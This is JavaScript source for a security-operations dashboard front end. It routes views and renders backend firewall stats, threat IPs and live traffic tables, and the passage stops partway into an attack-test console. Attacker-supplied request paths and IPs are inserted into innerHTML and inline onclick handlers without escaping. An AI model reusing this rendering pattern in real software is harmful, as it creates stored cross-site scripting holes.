/**
 * SentinelShield SOC Application Router & Controller
 * Connects Google Stitch Cyber Defense UI components to FastAPI backend.
 */

(function () {
  'use strict';

  let currentRoute = 'overview-dashboard';
  let isStreaming = true;
  let pollIntervalId = null;
  let activePollSeconds = 5;
  let cachedAlerts = [];
  let currentInspectingIp = null;

  // ---------------- UI Helpers & Toast ----------------
  function showToast(message, type = 'primary') {
    const container = document.getElementById('toast-container');
    if (!container) return;
    const toast = document.createElement('div');
    const colorClass = type === 'error' ? 'text-error border-error/40' : type === 'success' ? 'text-secondary border-secondary/40' : 'text-primary border-primary/40';
    toast.className = `pointer-events-auto px-4 py-2.5 rounded-lg bg-surface-container-high border shadow-2xl font-mono text-xs ${colorClass} flex items-center gap-2.5 transition-all transform duration-300`;
    toast.innerHTML = `
      <span class="material-symbols-outlined text-[18px]">${type === 'error' ? 'error' : 'verified_user'}</span>
      <span>${message}</span>
    `;
    container.appendChild(toast);
    setTimeout(() => {
      toast.classList.add('opacity-0', 'translate-y-2');
      setTimeout(() => toast.remove(), 350);
    }, 3500);
  }

  function updateClock() {
    const clock = document.getElementById('utc-clock');
    if (clock) {
      const now = new Date();
      clock.textContent = now.toTimeString().split(' ')[0] + ' UTC';
    }
  }
  setInterval(updateClock, 1000);
  updateClock();

  // ---------------- Router ----------------
  function navigate(route) {
    currentRoute = route || 'overview-dashboard';
    window.location.hash = currentRoute;

    // Update active nav class
    document.querySelectorAll('.nav-item').forEach(item => {
      if (item.getAttribute('data-route') === currentRoute) {
        item.className = 'nav-item active flex items-center justify-between px-3.5 py-2.5 rounded-lg text-sm bg-primary-container text-on-primary-container font-semibold shadow-[0_0_12px_rgba(77,142,255,0.25)] transition-all';
        const icon = item.querySelector('.material-symbols-outlined');
        if (icon) icon.className = 'material-symbols-outlined text-[19px] text-on-primary-container';
      } else {
        item.className = 'nav-item flex items-center justify-between px-3.5 py-2.5 rounded-lg text-sm text-on-surface-variant hover:bg-surface-container-high hover:text-on-surface transition-all group';
        const icon = item.querySelector('.material-symbols-outlined');
        if (icon) icon.className = 'material-symbols-outlined text-[19px] text-on-surface-variant group-hover:text-primary transition-colors';
      }
    });

    renderCurrentView();
  }

  window.addEventListener('hashchange', () => {
    const route = window.location.hash.replace('#', '');
    if (route && route !== currentRoute) {
      navigate(route);
    }
  });

  // ---------------- View Renderers ----------------
  async function renderCurrentView() {
    const container = document.getElementById('views-container');
    if (!container) return;

    // Clear background interval from previous live poll
    if (pollIntervalId) {
      clearInterval(pollIntervalId);
      pollIntervalId = null;
    }

    switch (currentRoute) {
      case 'overview-dashboard':
        await renderOverviewDashboard(container);
        break;
      case 'live-traffic-monitor':
        await renderLiveTrafficMonitor(container);
        break;
      case 'attack-detection-center':
        await renderAttackDetectionCenter(container);
        break;
      case 'security-alerts':
        await renderSecurityAlerts(container);
        break;
      case 'security-logs':
        await renderSecurityLogs(container);
        break;
      case 'ip-reputation-and-blocking':
        await renderIPReputation(container);
        break;
      case 'rate-limiting':
        await renderRateLimiting(container);
        break;
      case 'waf-rules':
        await renderWAFRules(container);
        break;
      case 'http-request-inspector':
        await renderHttpInspector(container);
        break;
      case 'reports-and-analytics':
        await renderReports(container);
        break;
      case 'system-health':
        await renderSystemHealth(container);
        break;
      default:
        await renderOverviewDashboard(container);
    }
  }

  // =========================================================================
  // VIEW 1: OVERVIEW DASHBOARD
  // =========================================================================
  async function renderOverviewDashboard(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6">
        <!-- Top Telemetry Simulation Banner -->
        <div class="w-full bg-surface-container-low/90 backdrop-blur-md rounded-xl p-3 flex flex-col md:flex-row items-start md:items-center justify-between gap-3 shadow-sm border border-surface-container-high/40">
          <div class="flex items-center gap-3">
            <span class="inline-flex items-center justify-center w-7 h-7 rounded bg-surface-container-highest text-secondary shrink-0">
              <span class="material-symbols-outlined text-[18px]">terminal</span>
            </span>
            <div class="flex flex-wrap items-center gap-x-3 gap-y-1 font-mono text-xs text-on-surface-variant">
              <span class="inline-flex items-center gap-1.5 text-on-surface font-medium">
                <span class="w-2 h-2 rounded-full bg-secondary animate-ping"></span>
                <span>FastAPI WAF &amp; IDS Engine Active</span>
              </span>
              <span class="text-outline">|</span>
              <span class="text-primary">Ingestion node listening at 127.0.0.1:8000</span>
              <span class="text-outline">|</span>
              <span>Inline Heuristics 99.7% mitigation</span>
            </div>
          </div>
          <div class="flex items-center gap-2">
            <span class="font-mono text-[10px] uppercase px-2 py-0.5 rounded bg-surface-container-highest text-secondary font-bold tracking-widest">INGESTION ACTIVE</span>
            <button id="toggleStreamBtn" class="px-3 py-1 rounded bg-surface-container-high hover:bg-surface-container-highest text-on-surface font-mono text-xs transition-all flex items-center gap-1.5">
              <span class="material-symbols-outlined text-[14px] text-secondary">motion_photos_paused</span>
              <span>Pause Stream</span>
            </button>
          </div>
        </div>

        <!-- 6 Wide KPI Grid -->
        <div class="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-6 gap-4" id="kpi-grid">
          <div class="p-4 rounded-xl bg-surface-container-low border border-surface-container-high/40 animate-pulse">
            <div class="h-3 w-16 bg-surface-container-high rounded"></div>
            <div class="h-6 w-24 bg-surface-container-high rounded mt-3"></div>
          </div>
        </div>

        <!-- Middle Row: Attack Distribution & Ingress Chart -->
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <!-- Attack Category Distribution -->
          <div class="rounded-xl bg-surface-container-low p-5 border border-surface-container-high/40 shadow-sm flex flex-col justify-between">
            <div class="flex items-center justify-between pb-3 border-b border-surface-container-high/30">
              <div class="flex items-center gap-2">
                <span class="material-symbols-outlined text-error text-[20px]">security_update_warning</span>
                <h3 class="font-bold text-sm text-on-surface">Attack Distribution</h3>
              </div>
              <span class="font-mono text-[11px] text-secondary">OWASP TOP 10</span>
            </div>
            <div class="space-y-3.5 my-4" id="attack-dist-bars">
              <!-- Rendered via API -->
            </div>
            <div class="pt-2 text-center text-xs font-mono text-outline border-t border-surface-container-high/20">
              Real-time classification based on WAF regex triggers
            </div>
          </div>

          <!-- Ingress Traffic Velocity Chart (2 cols) -->
          <div class="lg:col-span-2 rounded-xl bg-surface-container-low p-5 border border-surface-container-high/40 shadow-sm flex flex-col justify-between">
            <div class="flex items-center justify-between pb-3 border-b border-surface-container-high/30">
              <div class="flex items-center gap-2">
                <span class="material-symbols-outlined text-secondary text-[20px]">show_chart</span>
                <h3 class="font-bold text-sm text-on-surface">Ingress Traffic Velocity (RPS)</h3>
              </div>
              <div class="flex items-center gap-3 font-mono text-xs">
                <span class="flex items-center gap-1 text-secondary"><span class="w-2 h-2 rounded-full bg-secondary"></span>Allowed</span>
                <span class="flex items-center gap-1 text-error"><span class="w-2 h-2 rounded-full bg-error"></span>Blocked</span>
              </div>
            </div>
            <div class="w-full h-44 my-2 relative flex items-end">
              <svg class="w-full h-full overflow-visible" preserveaspectratio="none" viewbox="0 0 500 120">
                <defs>
                  <linearGradient id="areaGrad" x1="0" y1="0" x2="0" y2="1">
                    <stop offset="0%" stop-color="#4cd7f6" stop-opacity="0.3"></stop>
                    <stop offset="100%" stop-color="#4cd7f6" stop-opacity="0.0"></stop>
                  </linearGradient>
                </defs>
                <path d="M 0,90 Q 50,75, 100,80 T 200,50 T 300,65 T 400,25 T 500,35 L 500,120 L 0,120 Z" fill="url(#areaGrad)"></path>
                <path d="M 0,90 Q 50,75, 100,80 T 200,50 T 300,65 T 400,25 T 500,35" fill="none" stroke="#4cd7f6" stroke-width="2.5" stroke-linecap="round"></path>
                <path d="M 0,115 Q 80,110, 160,112 T 320,105 T 440,95 T 500,102" fill="none" stroke="#ef4444" stroke-width="2" stroke-dasharray="4 4"></path>
                <circle cx="400" cy="25" r="4" fill="#03b5d3" class="animate-ping"></circle>
                <circle cx="400" cy="25" r="3" fill="#ffffff"></circle>
              </svg>
            </div>
            <div class="flex items-center justify-between text-xs font-mono text-on-surface-variant pt-2 border-t border-surface-container-high/20">
              <span>Past 12h Ingress</span>
              <span class="text-secondary">Peak: 512.4 RPS</span>
              <span>Avg Latency: 1.1ms</span>
            </div>
          </div>
        </div>

        <!-- Lower Row: Recent Blocked Attacks Table & Top Threat Actors -->
        <div class="grid grid-cols-1 xl:grid-cols-12 gap-6">
          <!-- Recent Attacks Table (8 cols) -->
          <div class="xl:col-span-8 rounded-xl bg-surface-container-low border border-surface-container-high/40 overflow-hidden shadow-sm flex flex-col">
            <div class="flex items-center justify-between px-5 py-3.5 bg-surface-container-high/30 border-b border-surface-container-high/40">
              <div class="flex items-center gap-2">
                <span class="material-symbols-outlined text-[18px] text-error">gpp_maybe</span>
                <span class="font-bold text-sm text-on-surface">Recent WAF Intercepts &amp; Drops</span>
              </div>
              <a href="#live-traffic-monitor" class="text-xs font-mono text-primary hover:underline">View All Traffic →</a>
            </div>
            <div class="overflow-x-auto">
              <table class="w-full text-left font-mono text-xs">
                <thead class="bg-surface-container-lowest text-outline uppercase text-[10px] tracking-wider select-none">
                  <tr>
                    <th class="py-2.5 px-4">Method / Endpoint</th>
                    <th class="py-2.5 px-4">Source IP</th>
                    <th class="py-2.5 px-4">Vector</th>
                    <th class="py-2.5 px-4">Severity</th>
                    <th class="py-2.5 px-4 text-center">Action</th>
                    <th class="py-2.5 px-4 text-center">Inspect</th>
                  </tr>
                </thead>
                <tbody id="overview-events-body" class="divide-y divide-surface-container-high/20">
                  <tr><td colspan="6" class="text-center py-6 text-outline">Loading telemetry events...</td></tr>
                </tbody>
              </table>
            </div>
          </div>

          <!-- Top Threat Actors (4 cols) -->
          <div class="xl:col-span-4 rounded-xl bg-surface-container-low border border-surface-container-high/40 p-5 shadow-sm flex flex-col justify-between">
            <div class="flex items-center justify-between pb-3 border-b border-surface-container-high/30">
              <div class="flex items-center gap-2">
                <span class="material-symbols-outlined text-secondary text-[20px]">public</span>
                <h3 class="font-bold text-sm text-on-surface">Top Threat Actors</h3>
              </div>
              <span class="font-mono text-[10px] text-error uppercase font-bold">REPUTATION &gt; 80</span>
            </div>
            <div class="space-y-3 my-4" id="overview-top-ips">
              <!-- Rendered via API -->
            </div>
            <button onclick="location.hash='#ip-reputation-and-blocking'" class="w-full py-2 rounded-lg bg-surface-container-high hover:bg-surface-container-highest text-xs font-mono text-primary font-semibold transition-all">
              Manage IP Blocklist →
            </button>
          </div>
        </div>
      </div>
    `;

    // Fetch and bind backend data
    try {
      const [stats, dist, topIps, events] = await Promise.all([
        window.SentinelAPI.getStats(),
        window.SentinelAPI.getAttackDistribution(),
        window.SentinelAPI.getTopIPs(),
        window.SentinelAPI.getSecurityEvents({ limit: 6 })
      ]);

      // Render KPIs
      const kpiContainer = document.getElementById('kpi-grid');
      if (kpiContainer) {
        kpiContainer.innerHTML = `
          <!-- KPI 1 -->
          <div class="bg-surface-container-low rounded-xl p-4 border border-surface-container-high/40 flex flex-col justify-between">
            <div class="flex items-center justify-between text-outline text-[11px] font-mono uppercase">
              <span>Total Requests</span>
              <span class="text-secondary font-semibold">+12.4%/h</span>
            </div>
            <div class="my-2">
              <div class="text-2xl font-bold font-mono text-on-surface tracking-tight" id="kpi-total">${stats.total_requests.toLocaleString()}</div>
              <div class="text-[11px] text-outline font-mono">HTTP/S ingress volume</div>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full overflow-hidden mt-1">
              <div class="bg-secondary h-full rounded-full w-[90%]"></div>
            </div>
          </div>

          <!-- KPI 2 -->
          <div class="bg-surface-container-low rounded-xl p-4 border border-surface-container-high/40 flex flex-col justify-between">
            <div class="flex items-center justify-between text-outline text-[11px] font-mono uppercase">
              <span>Malicious</span>
              <span class="text-error font-semibold font-mono">${stats.malicious_rate_percent}%</span>
            </div>
            <div class="my-2">
              <div class="text-2xl font-bold font-mono text-error tracking-tight">${stats.malicious_requests.toLocaleString()}</div>
              <div class="text-[11px] text-outline font-mono">Exploits &amp; anomalies</div>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full overflow-hidden mt-1">
              <div class="bg-error h-full rounded-full w-[24%]"></div>
            </div>
          </div>

          <!-- KPI 3 -->
          <div class="bg-surface-container-low rounded-xl p-4 border border-surface-container-high/40 flex flex-col justify-between">
            <div class="flex items-center justify-between text-outline text-[11px] font-mono uppercase">
              <span>Blocked Attacks</span>
              <span class="text-secondary font-semibold font-mono">${stats.block_efficiency_percent}%</span>
            </div>
            <div class="my-2">
              <div class="text-2xl font-bold font-mono text-secondary tracking-tight">${stats.blocked_requests.toLocaleString()}</div>
              <div class="text-[11px] text-outline font-mono">Inline Kernel Drop</div>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full overflow-hidden mt-1">
              <div class="bg-secondary h-full rounded-full w-[87%]"></div>
            </div>
          </div>

          <!-- KPI 4 -->
          <div class="bg-surface-container-low rounded-xl p-4 border border-surface-container-high/40 flex flex-col justify-between">
            <div class="flex items-center justify-between text-outline text-[11px] font-mono uppercase">
              <span>Critical Incidents</span>
              <span class="text-error font-bold font-mono">P1 ESC</span>
            </div>
            <div class="my-2 flex items-baseline gap-2">
              <span class="text-2xl font-bold font-mono text-error tracking-tight">${stats.critical_alerts}</span>
              <span class="text-xs font-mono text-error/90 uppercase font-bold">Active</span>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full overflow-hidden mt-1">
              <div class="bg-error h-full rounded-full w-[60%]"></div>
            </div>
          </div>

          <!-- KPI 5 -->
          <div class="bg-surface-container-low rounded-xl p-4 border border-surface-container-high/40 flex flex-col justify-between">
            <div class="flex items-center justify-between text-outline text-[11px] font-mono uppercase">
              <span>Source IPs</span>
              <span class="text-primary font-semibold font-mono">114 Geo</span>
            </div>
            <div class="my-2">
              <div class="text-2xl font-bold font-mono text-on-surface tracking-tight">${stats.unique_ips.toLocaleString()}</div>
              <div class="text-[11px] text-outline font-mono">Unique clients</div>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full overflow-hidden mt-1">
              <div class="bg-primary h-full rounded-full w-[70%]"></div>
            </div>
          </div>

          <!-- KPI 6 -->
          <div class="bg-surface-container-low rounded-xl p-4 border border-surface-container-high/40 flex flex-col justify-between">
            <div class="flex items-center justify-between text-outline text-[11px] font-mono uppercase">
              <span>WAF Latency</span>
              <span class="text-secondary font-semibold font-mono">OPTIMAL</span>
            </div>
            <div class="my-2">
              <div class="text-2xl font-bold font-mono text-secondary tracking-tight">${stats.avg_latency_ms} ms</div>
              <div class="text-[11px] text-outline font-mono">Uptime: ${stats.uptime_percentage}%</div>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full overflow-hidden mt-1">
              <div class="bg-secondary h-full rounded-full w-[99%]"></div>
            </div>
          </div>
        `;
      }

      // Render Attack Distribution Bars
      const distContainer = document.getElementById('attack-dist-bars');
      if (distContainer) {
        distContainer.innerHTML = dist.map(item => `
          <div class="space-y-1">
            <div class="flex justify-between font-mono text-xs">
              <span class="flex items-center gap-1.5 font-medium text-on-surface">
                <span class="w-2 h-2 rounded-full" style="background-color: ${item.color}"></span>
                ${item.category}
              </span>
              <span class="text-on-surface font-semibold">${item.count} <span class="text-outline font-normal">(${item.percentage}%)</span></span>
            </div>
            <div class="w-full bg-surface-container-highest h-1.5 rounded-full overflow-hidden">
              <div class="h-full rounded-full" style="width: ${item.percentage}%; background-color: ${item.color}"></div>
            </div>
          </div>
        `).join('');
      }

      // Render Top Threat Actors
      const topIpsContainer = document.getElementById('overview-top-ips');
      if (topIpsContainer) {
        topIpsContainer.innerHTML = topIps.slice(0, 4).map(ip => `
          <div class="p-2.5 rounded-lg bg-surface-container flex items-center justify-between border border-surface-container-high/20">
            <div class="flex flex-col">
              <div class="flex items-center gap-1.5 font-mono text-xs font-bold text-on-surface">
                <span>${ip.ip_address}</span>
                <span class="text-[9px] px-1 py-0.2 rounded bg-surface-container-high text-outline">${ip.country}</span>
              </div>
              <span class="text-[10px] font-mono text-primary truncate max-w-[170px]">${ip.asn}</span>
            </div>
            <div class="flex items-center gap-2">
              <div class="text-right">
                <div class="text-xs font-mono font-bold text-error">${ip.reputation_score}/100</div>
                <div class="text-[9px] font-mono text-outline">${ip.attacks_count} drops</div>
              </div>
              <button onclick="handleQuickBlock('${ip.ip_address}')" class="px-2 py-1 rounded bg-error-container text-on-error-container font-mono text-[10px] font-bold hover:brightness-110">
                ${ip.is_blocked ? 'BLOCKED' : 'BLOCK'}
              </button>
            </div>
          </div>
        `).join('');
      }

      // Render Events Table
      const eventsBody = document.getElementById('overview-events-body');
      if (eventsBody) {
        if (events.length === 0) {
          eventsBody.innerHTML = `<tr><td colspan="6" class="text-center py-6 text-outline">No security events logged yet.</td></tr>`;
        } else {
          eventsBody.innerHTML = events.map(e => `
            <tr class="hover:bg-surface-container-high/40 transition-colors">
              <td class="py-2 px-4 whitespace-nowrap">
                <div class="flex items-center gap-2">
                  <span class="px-1.5 py-0.5 rounded text-[10px] font-bold ${e.http_method === 'POST' ? 'bg-secondary-container/20 text-secondary' : 'bg-primary/20 text-primary'}">${e.http_method}</span>
                  <span class="truncate max-w-[180px] font-semibold text-on-surface" title="${e.request_path}">${e.request_path}</span>
                </div>
              </td>
              <td class="py-2 px-4 text-primary whitespace-nowrap">${e.source_ip}</td>
              <td class="py-2 px-4 whitespace-nowrap">
                <span class="text-error font-semibold">${e.attack_category}</span>
              </td>
              <td class="py-2 px-4 whitespace-nowrap">
                <span class="px-2 py-0.5 rounded text-[10px] font-bold ${e.severity === 'CRITICAL' ? 'bg-error text-on-error' : e.severity === 'HIGH' ? 'bg-error-container text-on-error-container' : 'bg-surface-container-high text-secondary'}">${e.severity}</span>
              </td>
              <td class="py-2 px-4 text-center whitespace-nowrap">
                <span class="px-2 py-0.5 rounded text-[10px] font-bold ${e.action_taken === 'BLOCKED' ? 'bg-error/20 text-error' : 'bg-surface-container text-secondary'}">${e.action_taken}</span>
              </td>
              <td class="py-2 px-4 text-center">
                <button onclick="openModal('${e.source_ip}', '${e.attack_category}', '${e.matched_rule_id}', '${encodeURIComponent(e.payload_snippet || e.request_path)}')" class="p-1 rounded text-outline hover:text-secondary hover:bg-surface-container-high">
                  <span class="material-symbols-outlined text-[16px]">manage_search</span>
                </button>
              </td>
            </tr>
          `).join('');
        }
      }

      // Stream toggle button
      const streamBtn = document.getElementById('toggleStreamBtn');
      if (streamBtn) {
        streamBtn.onclick = () => {
          isStreaming = !isStreaming;
          streamBtn.innerHTML = isStreaming
            ? `<span class="material-symbols-outlined text-[14px] text-secondary">motion_photos_paused</span><span>Pause Stream</span>`
            : `<span class="material-symbols-outlined text-[14px] text-error">play_arrow</span><span>Resume Stream</span>`;
          showToast(isStreaming ? 'Ingress telemetry stream resumed.' : 'Ingress stream paused.', 'primary');
        };
      }

    } catch (err) {
      console.error('Overview dashboard error:', err);
      showToast('Error loading live dashboard statistics. Check backend connection.', 'error');
    }
  }

  // =========================================================================
  // VIEW 2: LIVE TRAFFIC MONITOR
  // =========================================================================
  async function renderLiveTrafficMonitor(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6">
        <!-- Live Velocity Header Strip -->
        <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">
          <div class="p-4 rounded-xl bg-surface-container-low border border-surface-container-high/40">
            <div class="flex items-center justify-between font-mono text-xs text-outline">
              <span>CURRENT VELOCITY</span>
              <span class="text-secondary font-semibold">+3.4%</span>
            </div>
            <div class="mt-2 flex items-baseline gap-1.5">
              <span class="text-2xl font-bold font-mono text-on-surface" id="live-rps-metric">482.4</span>
              <span class="text-xs font-mono text-outline">RPS</span>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full mt-2 overflow-hidden">
              <div class="bg-secondary h-full rounded-full w-[84%]"></div>
            </div>
          </div>
          <div class="p-4 rounded-xl bg-surface-container-low border border-surface-container-high/40">
            <div class="flex items-center justify-between font-mono text-xs text-outline">
              <span>ALLOWED INGRESS</span>
              <span class="text-primary font-semibold">97.0%</span>
            </div>
            <div class="mt-2 flex items-baseline gap-1.5">
              <span class="text-2xl font-bold font-mono text-primary">468.1</span>
              <span class="text-xs font-mono text-outline">RPS</span>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full mt-2 overflow-hidden">
              <div class="bg-primary h-full rounded-full w-[97%]"></div>
            </div>
          </div>
          <div class="p-4 rounded-xl bg-surface-container-low border border-surface-container-high/40">
            <div class="flex items-center justify-between font-mono text-xs text-outline">
              <span>BLOCKED MALICIOUS</span>
              <span class="text-error font-semibold">2.3%</span>
            </div>
            <div class="mt-2 flex items-baseline gap-1.5">
              <span class="text-2xl font-bold font-mono text-error">11.3</span>
              <span class="text-xs font-mono text-outline">RPS</span>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full mt-2 overflow-hidden">
              <div class="bg-error h-full rounded-full w-[18%]"></div>
            </div>
          </div>
          <div class="p-4 rounded-xl bg-surface-container-low border border-surface-container-high/40">
            <div class="flex items-center justify-between font-mono text-xs text-outline">
              <span>RATE LIMITED (429)</span>
              <span class="text-tertiary font-semibold">0.7%</span>
            </div>
            <div class="mt-2 flex items-baseline gap-1.5">
              <span class="text-2xl font-bold font-mono text-tertiary">3.0</span>
              <span class="text-xs font-mono text-outline">RPS</span>
            </div>
            <div class="w-full bg-surface-container h-1 rounded-full mt-2 overflow-hidden">
              <div class="bg-tertiary h-full rounded-full w-[8%]"></div>
            </div>
          </div>
        </div>

        <!-- Filter & Control Toolbar -->
        <div class="flex flex-col lg:flex-row items-stretch lg:items-center justify-between gap-3 bg-surface-container-low p-3.5 rounded-xl border border-surface-container-high/40 shadow-sm">
          <div class="flex flex-1 flex-wrap items-center gap-3">
            <div class="relative min-w-[240px] flex-1 max-w-sm">
              <span class="material-symbols-outlined absolute left-3 top-1/2 -translate-y-1/2 text-outline text-[16px]">filter_alt</span>
              <input id="traffic-search-input" class="w-full pl-8 pr-3 py-1.5 rounded bg-surface-container-lowest text-on-surface font-mono text-xs border border-surface-container-high/40 focus:outline-none focus:ring-1 focus:ring-primary" placeholder="Filter by Client IP, URI or Vector..." type="text"/>
            </div>

            <!-- HTTP Method Toggles -->
            <div class="flex items-center bg-surface-container-lowest p-0.5 rounded border border-surface-container-high/30 font-mono text-xs" id="method-toggles">
              <button class="px-2.5 py-1 rounded bg-primary-container text-on-primary-container font-semibold" data-m="ALL">ALL</button>
              <button class="px-2.5 py-1 rounded text-outline hover:text-on-surface" data-m="GET">GET</button>
              <button class="px-2.5 py-1 rounded text-outline hover:text-on-surface" data-m="POST">POST</button>
              <button class="px-2.5 py-1 rounded text-outline hover:text-on-surface" data-m="PUT">PUT</button>
            </div>

            <!-- Action Select -->
            <select id="traffic-action-select" class="bg-surface-container-lowest text-on-surface font-mono text-xs px-3 py-1.5 rounded border border-surface-container-high/40 focus:outline-none cursor-pointer">
              <option value="ALL">All Actions</option>
              <option value="ALLOWED">Allowed</option>
              <option value="BLOCKED">Blocked</option>
              <option value="THROTTLED">Throttled (429)</option>
            </select>
          </div>

          <div class="flex items-center gap-2 justify-end">
            <!-- Polling Rate -->
            <div class="flex items-center bg-surface-container-lowest p-0.5 rounded border border-surface-container-high/30 font-mono text-xs">
              <button class="px-2 py-1 text-outline hover:text-on-surface rounded" data-poll="1">1s</button>
              <button class="px-2 py-1 bg-primary-container text-on-primary-container font-bold rounded" data-poll="5">5s</button>
              <button class="px-2 py-1 text-outline hover:text-on-surface rounded" data-poll="10">10s</button>
            </div>
            <!-- Refresh Now Button -->
            <button id="refresh-traffic-btn" class="flex items-center gap-1 px-3 py-1.5 rounded bg-surface-container-high hover:bg-surface-container-highest text-on-surface font-mono text-xs">
              <span class="material-symbols-outlined text-[16px] text-secondary">refresh</span>
              <span>Sync</span>
            </button>
          </div>
        </div>

        <!-- Full-Width Ingress Feed Table -->
        <div class="rounded-xl bg-surface-container-low border border-surface-container-high/40 overflow-hidden shadow-xl flex flex-col">
          <div class="flex items-center justify-between px-5 py-3 bg-surface-container-high/30 border-b border-surface-container-high/40 font-mono text-xs">
            <div class="flex items-center gap-2 text-on-surface font-semibold">
              <span class="material-symbols-outlined text-[16px] text-secondary">view_stream</span>
              <span>INSPECTED REQUEST TELEMETRY FEED</span>
            </div>
            <span class="text-secondary" id="traffic-status-line">Streaming live traffic from SQLite database</span>
          </div>

          <div class="overflow-x-auto">
            <table class="w-full text-left font-mono text-xs">
              <thead class="bg-surface-container-lowest text-outline uppercase text-[10px] tracking-wider select-none">
                <tr>
                  <th class="py-2.5 px-4 w-16">Method</th>
                  <th class="py-2.5 px-4">Endpoint</th>
                  <th class="py-2.5 px-4">Source IP &amp; Origin</th>
                  <th class="py-2.5 px-4 w-24">Status</th>
                  <th class="py-2.5 px-4 w-20 text-right">Latency</th>
                  <th class="py-2.5 px-4">Threat Signature / Vector</th>
                  <th class="py-2.5 px-4 text-center w-24">Action</th>
                  <th class="py-2.5 px-4 text-center w-16">Trace</th>
                </tr>
              </thead>
              <tbody id="traffic-table-body" class="divide-y divide-surface-container-high/20">
                <tr><td colspan="8" class="text-center py-8 text-outline">Loading inspected frames...</td></tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    `;

    let activeMethod = 'ALL';

    async function loadTraffic() {
      const search = document.getElementById('traffic-search-input')?.value || '';
      const action = document.getElementById('traffic-action-select')?.value || 'ALL';

      try {
        const logs = await window.SentinelAPI.getTraffic({
          method: activeMethod,
          action: action,
          search: search,
          limit: 30
        });

        const tbody = document.getElementById('traffic-table-body');
        if (!tbody) return;

        if (logs.length === 0) {
          tbody.innerHTML = `<tr><td colspan="8" class="text-center py-8 text-outline">No HTTP traffic matches current filters.</td></tr>`;
          return;
        }

        tbody.innerHTML = logs.map(l => {
          const statusColor = l.status_code === 200 ? 'bg-surface-container-high text-primary' : l.status_code === 403 ? 'bg-error-container/40 text-error' : l.status_code === 429 ? 'bg-tertiary-container/40 text-tertiary' : 'bg-surface-container text-outline';
          const actionBadge = l.action === 'BLOCKED' ? 'bg-error text-on-error' : l.action === 'THROTTLED' ? 'bg-tertiary text-surface' : 'bg-surface-container-highest text-secondary';
          return `
            <tr class="hover:bg-surface-container-high/40 transition-colors">
              <td class="py-2 px-4 whitespace-nowrap">
                <span class="px-2 py-0.5 rounded text-[10px] font-bold ${l.http_method === 'POST' ? 'bg-secondary-container/20 text-secondary' : 'bg-primary/20 text-primary'}">${l.http_method}</span>
              </td>
              <td class="py-2 px-4 whitespace-nowrap">
                <span class="font-semibold text-on-surface truncate max-w-xs block" title="${l.path}">${l.path}</span>
              </td>
              <td class="py-2 px-4 whitespace-nowrap">
                <div class="flex items-center gap-1.5">
                  <span class="text-primary font-semibold">${l.source_ip}</span>
                  <span class="text-[10px] text-outline">(${l.country_code})</span>
                </div>
              </td>
              <td class="py-2 px-4 whitespace-nowrap">
                <span class="px-1.5 py-0.5 rounded text-[10px] font-bold ${statusColor}">${l.status_code}</span>
              </td>
              <td class="py-2 px-4 text-right text-outline whitespace-nowrap">${l.latency_ms} ms</td>
              <td class="py-2 px-4 whitespace-nowrap">
                <span class="${l.threat_vector !== 'CLEAN' ? 'text-error font-semibold' : 'text-outline'}">${l.threat_vector}</span>
              </td>
              <td class="py-2 px-4 text-center whitespace-nowrap">
                <span class="px-2 py-0.5 rounded text-[10px] font-bold ${actionBadge}">${l.action}</span>
              </td>
              <td class="py-2 px-4 text-center">
                <button onclick="openModal('${l.source_ip}', '${l.threat_vector}', 'TRAFFIC-TRACE-${l.id}', '${encodeURIComponent(l.query_params || l.path)}')" class="p-1 rounded text-outline hover:text-secondary hover:bg-surface-container-high">
                  <span class="material-symbols-outlined text-[16px]">manage_search</span>
                </button>
              </td>
            </tr>
          `;
        }).join('');
      } catch (err) {
        console.error('Traffic feed error:', err);
      }
    }

    // Bind event handlers
    document.getElementById('refresh-traffic-btn')?.addEventListener('click', loadTraffic);
    document.getElementById('traffic-search-input')?.addEventListener('input', loadTraffic);
    document.getElementById('traffic-action-select')?.addEventListener('change', loadTraffic);

    // Method filter buttons
    document.querySelectorAll('#method-toggles button').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('#method-toggles button').forEach(b => {
          b.className = 'px-2.5 py-1 rounded text-outline hover:text-on-surface';
        });
        btn.className = 'px-2.5 py-1 rounded bg-primary-container text-on-primary-container font-semibold';
        activeMethod = btn.getAttribute('data-m');
        loadTraffic();
      });
    });

    // Polling interval selectors
    document.querySelectorAll('[data-poll]').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('[data-poll]').forEach(b => {
          b.className = 'px-2 py-1 text-outline hover:text-on-surface rounded';
        });
        btn.className = 'px-2 py-1 bg-primary-container text-on-primary-container font-bold rounded';
        activePollSeconds = parseInt(btn.getAttribute('data-poll'), 10);
        if (pollIntervalId) clearInterval(pollIntervalId);
        pollIntervalId = setInterval(loadTraffic, activePollSeconds * 1000);
      });
    });

    // Start initial load and background interval
    loadTraffic();
    pollIntervalId = setInterval(loadTraffic, activePollSeconds * 1000);
  }

  // =========================================================================
  // VIEW 3: ATTACK DETECTION CENTER & TEST RUNNER
  // =========================================================================
  async function renderAttackDetectionCenter(container) {
    container.innerHTML = `
      <div class="flex flex-col gap-6">
        <!-- Interactive Testing Terminal -->
        <div class="rounded-xl bg-surface-container-low border border-surface-container-high/60 p-6 shadow-xl relative overflow-hidden">
          <div class="flex items-center justify-between pb-4 border-b border-surface-container-high/40">
            <div class="flex items-center gap-3">
              <div class="w-9 h-9 rounded-lg bg-error-container/30 text-error flex items-center justify-center font-bold">
                <span class="material-symbols-outlined text-[20px]">biotech</span>
              </div>
              <div>
                <h2 class="text-base font-bold text-on-surface">Interactive Threat Detection Console</h2>
                <p class="font-mono text-xs text-outline">Submit live test payloads to evaluate SentinelShield WAF rules &amp; heuristics</p>
              </div>
            </div>
